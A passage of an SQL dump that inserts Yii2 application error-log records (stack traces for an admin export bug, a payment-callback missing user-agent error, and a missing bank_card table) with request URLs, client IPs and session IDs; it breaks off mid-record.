INSERT INTO `log` VALUES ('34', '1', 'yii\\base\\UnknownPropertyException', '1495018077.228269', '[GET][http://www.semi-autogeneousmillprice.cn/admin/user/user-excel?][60.170.186.143][2][bt570t3bebg35j303ra68bitj1]', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: admin\\models\\User::user\' in /phpstudy/www/x50/vendor/yiisoft/yii2/base/Component.php:143\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/BaseActiveRecord.php(252): yii\\base\\Component->__get(\'user\')\n#1 /phpstudy/www/x50/frontend/modules/admin/controllers/UserController.php(110): yii\\db\\BaseActiveRecord->__get(\'user\')\n#2 [internal function]: admin\\controllers\\UserController->actionUserExcel()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'user-excel\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'admin/user/user...\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('35', '1', 'yii\\base\\UnknownPropertyException', '1495018112.976157', '[GET][http://www.semi-autogeneousmillprice.cn/admin/user/user-excel?][60.170.186.143][2][bt570t3bebg35j303ra68bitj1]', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: admin\\models\\User::user\' in /phpstudy/www/x50/vendor/yiisoft/yii2/base/Component.php:143\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/BaseActiveRecord.php(252): yii\\base\\Component->__get(\'user\')\n#1 /phpstudy/www/x50/frontend/modules/admin/controllers/UserController.php(110): yii\\db\\BaseActiveRecord->__get(\'user\')\n#2 [internal function]: admin\\controllers\\UserController->actionUserExcel()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'user-excel\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'admin/user/user...\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('36', '1', 'yii\\base\\UnknownPropertyException', '1495018190.750016', '[GET][http://www.semi-autogeneousmillprice.cn/admin/user/user-excel?][60.170.186.143][2][bt570t3bebg35j303ra68bitj1]', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: admin\\models\\User::user\' in /phpstudy/www/x50/vendor/yiisoft/yii2/base/Component.php:143\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/BaseActiveRecord.php(252): yii\\base\\Component->__get(\'user\')\n#1 /phpstudy/www/x50/frontend/modules/admin/controllers/UserController.php(110): yii\\db\\BaseActiveRecord->__get(\'user\')\n#2 [internal function]: admin\\controllers\\UserController->actionUserExcel()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'user-excel\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'admin/user/user...\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('37', '1', 'yii\\base\\ErrorException:8', '1495018300.1792', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a51%3a39&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+18%3a51%3a39&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][jjpoudcvdapc2ih83a04gehhl3]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('38', '1', 'yii\\base\\ErrorException:8', '1495018674.8445', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171753349384&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a57%3a54&sysorderid=1705171753343190050&completiontime=2017%2f05%2f17+18%3a57%3a54&attach=&msg=&sign=b5573a9a5d14f54eb2533becd2f59b0c][211.149.156.143][-][p4q6dcouoqqndc9ec6t16fmgi1]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('39', '1', 'yii\\base\\ErrorException:8', '1495019844.0702', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+19%3a17%3a23&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+19%3a17%3a23&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][5hc15l8a65btsl3vqja4cka430]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('40', '1', 'yii\\base\\ErrorException:8', '1495020103.4857', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+19%3a21%3a43&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+19%3a21%3a43&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][tombck5i1pijsmnhfb0jv8olj5]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('41', '1', 'yii\\base\\ErrorException:8', '1495020478.4312', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171753349384&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+19%3a27%3a57&sysorderid=1705171753343190050&completiontime=2017%2f05%2f17+19%3a27%3a57&attach=&msg=&sign=b5573a9a5d14f54eb2533becd2f59b0c][211.149.156.143][-][7i743lp1gug73otoqgo847k482]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('42', '1', 'yii\\base\\ErrorException:8', '1495021649.0645', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+19%3a47%3a28&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+19%3a47%3a28&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][0a8321m0gmskbdacg2en0cled4]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('43', '1', 'yii\\base\\ErrorException:8', '1495021904.8923', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+19%3a51%3a44&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+19%3a51%3a44&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][b5vi71hgt6sbd3jv04tt6ke341]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('44', '1', 'yii\\base\\ErrorException:8', '1495022281.4881', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171753349384&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+19%3a58%3a01&sysorderid=1705171753343190050&completiontime=2017%2f05%2f17+19%3a58%3a01&attach=&msg=&sign=b5573a9a5d14f54eb2533becd2f59b0c][211.149.156.143][-][5juoe6v0691q6ok7r2jl21cph6]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('45', '1', 'yii\\base\\ErrorException:8', '1495023451.5348', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+20%3a17%3a31&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+20%3a17%3a31&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][q6lb617jntsob2r18r8a4kdlg5]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('46', '1', 'yii\\base\\ErrorException:8', '1495025507.3168', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+20%3a51%3a46&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+20%3a51%3a46&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][ngaovp16bdq4og5fnlfrde2a20]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('47', '1', 'yii\\base\\ErrorException:8', '1495025883.2122', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171753349384&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+20%3a58%3a02&sysorderid=1705171753343190050&completiontime=2017%2f05%2f17+20%3a58%3a02&attach=&msg=&sign=b5573a9a5d14f54eb2533becd2f59b0c][211.149.156.143][-][tfkt0s9g7bpfgfoqlq7ahjag56]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('48', '1', 'yii\\base\\ErrorException:8', '1495027053.2007', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+21%3a17%3a32&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+21%3a17%3a32&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][qft5aj5maim2j3dc2jb0pbmjo6]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('49', '1', 'yii\\db\\Exception', '1495028321.8547', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][pfjuts1auflkiqj1hpv2bdrih3]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('50', '1', 'yii\\db\\Exception', '1495031302.4691', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100005][epbecjoir6onrdjf51nbpferl4]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 